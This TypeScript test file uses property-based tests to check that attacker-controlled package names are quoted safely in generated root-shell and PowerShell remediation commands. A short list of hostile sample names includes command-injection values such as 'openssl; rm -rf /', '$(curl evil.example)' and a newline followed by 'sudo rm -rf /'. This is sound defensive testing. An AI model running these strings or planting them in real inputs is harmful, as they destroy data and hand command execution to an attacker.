// Req 14.10: a package name off a scanned host reaches a copied command as
// exactly one literal word, whatever characters it carries.
//
// The name is attacker-controlled: it is whatever the host's package database
// says, and parse_package_name splits on the last "@", so even a crafted
// *version* can end up inside the name. These commands are pasted into a root
// shell, so the property is checked against a shell's own reading of the line
// rather than against a list of dangerous characters -- a list is exactly the
// thing that misses one.

import fc from "fast-check";
import { describe, expect, it } from "vitest";

import {
  buildBulkFixScript,
  commentSafe,
  getDistroTooling,
  powershellQuote,
  shellQuote,
} from "./remediation";
import type { CveFinding } from "../types";

/**
 * Split a line the way a POSIX shell does, for the subset these commands use.
 *
 * Throws on anything a shell would treat as more than a plain word -- an
 * operator, a redirection, a substitution, a glob -- outside quotes, because a
 * name that produces one has escaped its quoting. Deliberately strict: a false
 * alarm here fails a test, a missed one ships an injection.
 */
function posixWords(line: string): string[] {
  const words: string[] = [];
  let word = "";
  let inWord = false;
  let i = 0;
  while (i < line.length) {
    const c = line[i];
    if (c === "'") {
      const end = line.indexOf("'", i + 1);
      if (end === -1) throw new Error("unterminated single quote");
      word += line.slice(i + 1, end);
      inWord = true;
      i = end + 1;
    } else if (c === '"') {
      // Double quotes still expand $, ` and \, so any of them inside is a leak.
      const end = line.indexOf('"', i + 1);
      if (end === -1) throw new Error("unterminated double quote");
      const body = line.slice(i + 1, end);
      if (/[$`\\]/.test(body)) throw new Error("expansion inside double quotes");
      word += body;
      inWord = true;
      i = end + 1;
    } else if (c === " " || c === "\t") {
      if (inWord) words.push(word);
      word = "";
      inWord = false;
      i += 1;
    } else if (/[;&|<>()$`\\"*?[\]{}~#!\n\r]/.test(c) && !(c === "&" && line[i + 1] === "&")) {
      throw new Error(`unquoted shell metacharacter ${JSON.stringify(c)}`);
    } else if (c === "&") {
      // "&&" between two commands of our own; treat it as a word separator.
      if (inWord) words.push(word);
      words.push("&&");
      word = "";
      inWord = false;
      i += 2;
    } else {
      word += c;
      inWord = true;
      i += 1;
    }
  }
  if (inWord) words.push(word);
  return words;
}

/** Undo PowerShell single quoting, which escapes a quote by doubling it. */
function powershellWord(quoted: string): string {
  if (!quoted.startsWith("'")) {
    expect(quoted).toMatch(/^[A-Za-z0-9@%+=:,./_-]+$/);
    return quoted;
  }
  expect(quoted.endsWith("'")).toBe(true);
  const body = quoted.slice(1, -1);
  let out = "";
  for (let i = 0; i < body.length; i += 1) {
    const c = body[i];
    if ("'\u2018\u2019\u201a\u201b".includes(c)) {
      // Inside the quotes, every quote character must come doubled.
      expect(body[i + 1]).toBe(c);
      i += 1;
    }
    out += c;
  }
  return out;
}

/** What a name becomes on the way in: control characters cannot survive. */
function printable(name: string): string {
  // eslint-disable-next-line no-control-regex
  return name.replace(/[\u0000-\u001f\u007f\u2028\u2029]/g, "?");
}

const anyName = fc.string({ unit: "binary", minLength: 1, maxLength: 40 });
const hostile = fc.constantFrom(
  "openssl; rm -rf /",
  "openssl@3.0;id",
  "$(curl evil.example)",
  "`id`",
  "a'b",
  "a\nsudo rm -rf /",
  "--help",
  "* ",
  "pkg && reboot",
  "~root",
);
const names = fc.oneof(anyName, hostile);

describe("shellQuote (Req 14.10)", () => {
  it("leaves an ordinary package name bare", () => {
    for (const name of ["openssl", "libssl3", "python3.11", "g++", "libstdc++6", "@scope/pkg"]) {
      expect(shellQuote(name)).toBe(name);
    }
  });

  it("makes any name exactly one shell word, equal to the name", () => {
    fc.assert(
      fc.property(names, (name) => {
        expect(posixWords(shellQuote(name))).toEqual([printable(name)]);
      }),
    );
  });
});

describe("the generated commands (Req 14.10)", () => {
  const families: Array<[string, string]> = [
    ["linux", "Debian GNU/Linux 12"],
    ["linux", "Rocky Linux 9"],
    ["linux", "openSUSE Leap 15"],
    ["linux", "Alpine Linux"],
    ["linux", "Arch Linux"],
  ];

  it("pass the name to the package manager as one argument", () => {
    fc.assert(
      fc.property(names, fc.constantFrom(...families), (name, [platform, os]) => {
        const tooling = getDistroTooling(platform as "linux", os, null);
        for (const command of [tooling.purgeCmd(name), tooling.checkUpdateCmd(name)]) {
          const words = posixWords(command.replace(/ 2>\/dev\/null$/, "").replace(/ \| /, " "));
          // The name itself, or zypper's space-padded literal, is one word.
          const want = printable(name);
          expect(words.filter((w) => w === want || w === ` ${want} `)).toHaveLength(1);
        }
      }),
    );
  });

  it("quote a Windows package id for PowerShell", () => {
    fc.assert(
      fc.property(names, (name) => {
        const quoted = powershellQuote(name);
        expect(powershellWord(quoted)).toBe(printable(name));
      }),
    );
  });

  it("never let host-derived text leave a comment line", () => {
    fc.assert(
      fc.property(names, names, (name, osName) => {
        const finding = {
          packageName: name,
          packageIdentifier: `Debian:12:${name}@1.0 (fixed in 1.1)`,
          fixStatus: "available",
          fixVersion: "1.1",
        } as unknown as CveFinding;
        const script = buildBulkFixScript([finding], "linux", `Debian ${osName}`);
        for (const line of script.split("\n")) {
          if (line === "" || line.startsWith("#")) continue;
          // Every executable line is ours, with the name as one quoted word.
          const words = posixWords(line);
          expect(words.slice(0, 2)).toEqual(["sudo", "apt"]);
          if (words.includes("--only-upgrade")) {
            expect(words.slice(-1)).toEqual([printable(name)]);
          }
        }
      }),
    );
  });

  it("comment text carries no line break of any kind", () => {
    fc.assert(
      fc.property(anyName, (text) => {
        expect(commentSafe(text)).not.toMatch(/[\n\r\u2028\u2029]/);
      }),
    );
  });
});

describe("several names in one command (Req 2.8, 14.10)", () => {
  it("passes every name to the package manager as its own word", () => {
    fc.assert(
      fc.property(fc.array(names, { minLength: 1, maxLength: 4 }), (list) => {
        const tooling = getDistroTooling("linux", "Debian GNU/Linux 12", null);
        const words = posixWords(tooling.purgeCmd(list));
        expect(words.slice(0, 4)).toEqual(["sudo", "apt", "remove", "--purge"]);
        expect(words.slice(4)).toEqual(list.map(printable));
      }),
    );
  });
});
